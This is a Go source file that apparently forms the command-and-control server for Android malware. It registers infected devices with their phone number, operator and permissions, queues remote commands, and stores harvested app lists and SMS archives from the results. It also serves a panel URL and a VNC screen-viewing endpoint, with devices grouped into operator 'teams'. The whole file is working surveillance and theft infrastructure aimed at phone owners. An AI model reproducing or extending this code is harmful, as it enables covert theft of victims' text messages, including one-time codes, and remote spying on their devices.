package api

import (
	"encoding/json"
	"log"
	"net/http"
	"time"

	"redwing/internal/db"
)

type DeviceRegisterRequest struct {
	DeviceID       string `json:"device_id"`
	TeamID         string `json:"team_id"`
	Model          string `json:"model"`
	AndroidVersion string `json:"android_version"`
	Country        string `json:"country"`
	BatteryLevel   int    `json:"battery_level"`
	Phone          string `json:"phone"`
	Operator       string `json:"operator"`
	Token          string `json:"token"`
	BuildID        string `json:"build_id"`
}

func HandleDeviceRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var raw map[string]any
	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
		writeJSON(w, map[string]any{"error": "invalid request"})
		return
	}

	deviceID, _ := raw["device_id"].(string)
	teamID, _ := raw["team_id"].(string)
	if deviceID == "" || teamID == "" {
		writeJSON(w, map[string]any{"error": "device_id and team_id required"})
		return
	}

	teamID = ResolveDeviceTeam(teamID)

	model, _ := raw["model"].(string)
	androidVer, _ := raw["android_version"].(string)
	country, _ := raw["country"].(string)
	batLevel := -1
	if bl, ok := raw["battery_level"].(float64); ok {
		batLevel = int(bl)
	}

	if err := upsertDevice(deviceID, teamID, model, androidVer, country, batLevel); err != nil {
		log.Printf("[DEVICE] register failed device=%s team=%s: %v", deviceID, teamID, err)
		writeJSON(w, map[string]any{"error": "device registration failed"})
		return
	}


	if dt, ok := raw["device_type"].(string); ok && dt != "" {
		db.DB.Exec("UPDATE devices SET device_type = ? WHERE device_id = ?", dt, deviceID)
	}
	if perms, ok := raw["permissions"]; ok {
		if pj, err := json.Marshal(perms); err == nil {
			db.DB.Exec("UPDATE devices SET permissions = ? WHERE device_id = ?", string(pj), deviceID)
		}
	}
	if phone, ok := raw["phone_number"].(string); ok && phone != "" {
		db.DB.Exec("UPDATE devices SET phone = ? WHERE device_id = ?", phone, deviceID)
	}

	writeJSON(w, map[string]any{"success": true, "device_id": deviceID})
}

func HandleDeviceUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req map[string]any
	if json.NewDecoder(r.Body).Decode(&req) != nil {
		writeJSON(w, map[string]any{"error": "invalid request"})
		return
	}

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if deviceID == "" {
		writeJSON(w, map[string]any{"error": "device_id required"})
		return
	}
	if teamID == "" {
		writeJSON(w, map[string]any{"error": "team_id required"})
		return
	}

	teamID = ResolveDeviceTeam(teamID)

	if err := upsertDevice(deviceID, teamID, "", "", "", -1); err != nil {
		log.Printf("[DEVICE] update upsert failed device=%s team=%s: %v", deviceID, teamID, err)
		writeJSON(w, map[string]any{"error": "device update failed"})
		return
	}

	if model, ok := req["model"].(string); ok && model != "" {
		db.DB.Exec("UPDATE devices SET model = ? WHERE device_id = ? AND team_id = ?", model, deviceID, teamID)
	}
	if ver, ok := req["android_version"].(string); ok && ver != "" {
		db.DB.Exec("UPDATE devices SET android_version = ? WHERE device_id = ? AND team_id = ?", ver, deviceID, teamID)
	}
	if country, ok := req["country"].(string); ok && country != "" {
		db.DB.Exec("UPDATE devices SET country = ? WHERE device_id = ? AND team_id = ?", country, deviceID, teamID)
	}
	if bat, ok := req["battery_level"].(float64); ok {
		db.DB.Exec("UPDATE devices SET battery_level = ? WHERE device_id = ? AND team_id = ?", int(bat), deviceID, teamID)
	}

	db.DB.Exec("UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND team_id = ?", deviceID, teamID)

	writeJSON(w, map[string]any{"success": true})
}

func HandleCommandsPending(w http.ResponseWriter, r *http.Request) {
	teamID := r.URL.Query().Get("team_id")
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	deviceID := r.URL.Query().Get("device_id")

	if deviceID == "" && teamID != "" {
		db.DB.QueryRow("SELECT device_id FROM devices WHERE team_id = ? AND is_online = 1 ORDER BY last_seen DESC LIMIT 1", teamID).Scan(&deviceID)
		if deviceID == "" {
			db.DB.QueryRow("SELECT device_id FROM devices WHERE team_id = ? ORDER BY last_seen DESC LIMIT 1", teamID).Scan(&deviceID)
		}
	}

	if teamID == "" || deviceID == "" {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}

	now := time.Now().UTC()
	stuckSentBefore := now.Add(-60 * time.Second).Format("2006-01-02 15:04:05")
	rows, err := db.DB.Query(
		`SELECT id, command, params, status, created_at FROM commands
		 WHERE device_id = ? AND team_id = ?
		   AND (status = 'pending' OR (status = 'sent' AND sent_at <= ?))
		 ORDER BY created_at ASC LIMIT 10`,
		deviceID, teamID, stuckSentBefore,
	)
	if err != nil {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}
	defer rows.Close()

	nowStr := now.Format("2006-01-02 15:04:05")
	type cmdRow struct {
		id, command, params, status, createdAt string
	}
	var fetched []cmdRow
	for rows.Next() {
		var c cmdRow
		rows.Scan(&c.id, &c.command, &c.params, &c.status, &c.createdAt)
		fetched = append(fetched, c)
	}
	rows.Close()

	var commands []map[string]any
	for _, c := range fetched {
		cmd := map[string]any{"id": c.id, "command": c.command, "created_at": c.createdAt}
		if c.params != "" {
			var p map[string]any
			if json.Unmarshal([]byte(c.params), &p) == nil {
				cmd["params"] = p
			}
		}
		commands = append(commands, cmd)
		db.DB.Exec("UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?", nowStr, c.id)
	}

	if commands == nil {
		commands = []map[string]any{}
	}
	writeJSON(w, map[string]any{"commands": commands})
}

func HandleCommandStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req map[string]any
	if json.NewDecoder(r.Body).Decode(&req) != nil {
		writeJSON(w, map[string]any{"error": "invalid"})
		return
	}

	cmdID, _ := req["command_id"].(string)
	status, _ := req["status"].(string)
	result, _ := req["result"]
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}

	if cmdID == "" {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	resultJSON := ""
	if result != nil {
		b, _ := json.Marshal(result)
		resultJSON = string(b)
	}

	now := time.Now().UTC().Format("2006-01-02 15:04:05")
	db.DB.Exec("UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?",
		status, resultJSON, now, cmdID)

	if result != nil && resultJSON != "" {
		var command, deviceID, dbTeamID string
		db.DB.QueryRow("SELECT command, device_id, COALESCE(team_id, '') FROM commands WHERE id = ?", cmdID).Scan(&command, &deviceID, &dbTeamID)

		resolvedTeam := teamID
		if dbTeamID != "" {
			resolvedTeam = dbTeamID
		}

		switch command {
		case "get_apps", "apps_list":
			appsJSON := resultJSON
			if arr, ok := result.([]any); ok {
				b, _ := json.Marshal(arr)
				appsJSON = string(b)
			} else {
				var resultObj map[string]any
				if json.Unmarshal([]byte(resultJSON), &resultObj) == nil {
					if appsArr, ok := resultObj["apps"]; ok {
						if b, err := json.Marshal(appsArr); err == nil {
							appsJSON = string(b)
						}
					}
				}
			}
			db.DB.Exec("UPDATE devices SET apps_list = ? WHERE device_id = ?", appsJSON, deviceID)
		case "get_sms_archive", "get_sms":
			parseSMSResult(deviceID, resolvedTeam, []byte(resultJSON))
		}
	}

	writeJSON(w, map[string]any{"success": true})
}

func HandleBootstrap(w http.ResponseWriter, r *http.Request) {
	host := r.Host
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	baseURL := scheme + "://" + host
	wsURL := "ws://" + host

	writeJSON(w, map[string]any{
		"panel_url":      baseURL,
		"vnc_url":        wsURL + "/screen",
		"fallback_panel": []string{baseURL},
		"gp":             []string{},
		"status":         "ok",
	})
}

func HandleDeviceHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	if deviceID == "" {
		deviceID = r.Header.Get("X-Device-ID")
	}
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}

	if deviceID == "" && teamID != "" {
		db.DB.QueryRow("SELECT device_id FROM devices WHERE team_id = ? ORDER BY last_seen DESC LIMIT 1", teamID).Scan(&deviceID)
	}
	if deviceID == "" {
		db.DB.QueryRow("SELECT device_id FROM devices WHERE is_online = 1 ORDER BY last_seen DESC LIMIT 1").Scan(&deviceID)
	}

	if deviceID != "" {
		db.DB.Exec(`UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, deviceID)
	}

	commands := heartbeatPendingCommands(deviceID)
	writeJSON(w, map[string]any{"status": "ok", "commands": commands})
}

func heartbeatPendingCommands(deviceID string) []map[string]any {
	if deviceID == "" {
		return []map[string]any{}
	}

	var teamID string
	db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	if teamID == "" {
		return []map[string]any{}
	}

	now := time.Now().UTC()
	stuckSentBefore := now.Add(-60 * time.Second).Format("2006-01-02 15:04:05")

	rows, err := db.DB.Query(
		`SELECT id, command, params FROM commands
		 WHERE device_id = ? AND team_id = ?
		   AND (status = 'pending' OR (status = 'sent' AND sent_at <= ?))
		 ORDER BY created_at ASC LIMIT 5`,
		deviceID, teamID, stuckSentBefore,
	)
	if err != nil {
		return []map[string]any{}
	}
	defer rows.Close()

	nowStr := now.Format("2006-01-02 15:04:05")
	type cmdRow struct {
		id, command, params string
	}
	var fetched []cmdRow
	for rows.Next() {
		var c cmdRow
		rows.Scan(&c.id, &c.command, &c.params)
		fetched = append(fetched, c)
	}
	rows.Close()

	var commands []map[string]any
	for _, c := range fetched {
		cmd := map[string]any{"id": c.id, "command": c.command}
		if c.params != "" && c.params != "{}" {
			var p map[string]any
			if json.Unmarshal([]byte(c.params), &p) == nil {
				cmd["params"] = p
			}
		}
		commands = append(commands, cmd)
		db.DB.Exec("UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?", nowStr, c.id)
	}

	if commands == nil {
		commands = []map[string]any{}
	}
	return commands
}

func upsertDevice(deviceID, teamID, model, androidVersion, country string, batteryLevel int) error {
	if deviceID == "" || teamID == "" {
		return nil
	}
	if err := ensureTeam(teamID, "team_"+teamID); err != nil {
		return err
	}

	if _, err := db.DB.Exec(
		`INSERT OR IGNORE INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, last_seen, created_at)
		 VALUES (?, ?, ?, ?, ?, ?, 1, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
		deviceID, deviceID, teamID, model, androidVersion, country, maxInt(batteryLevel, 0),
	); err != nil {
		return err
	}

	_, err := db.DB.Exec(
		`UPDATE devices
		 SET team_id = ?,
		     model = CASE WHEN ? != '' THEN ? ELSE model END,
		     android_version = CASE WHEN ? != '' THEN ? ELSE android_version END,
		     country = CASE WHEN ? != '' THEN ? ELSE country END,
		     battery_level = CASE WHEN ? >= 0 THEN ? ELSE battery_level END,
		     is_online = 1,
		     last_seen = CURRENT_TIMESTAMP
		 WHERE id = ?`,
		teamID,
		model, model,
		androidVersion, androidVersion,
		country, country,
		batteryLevel, batteryLevel,
		deviceID,
	)
	return err
}

func maxInt(v, fallback int) int {
	if v < 0 {
		return fallback
	}
	return v
}
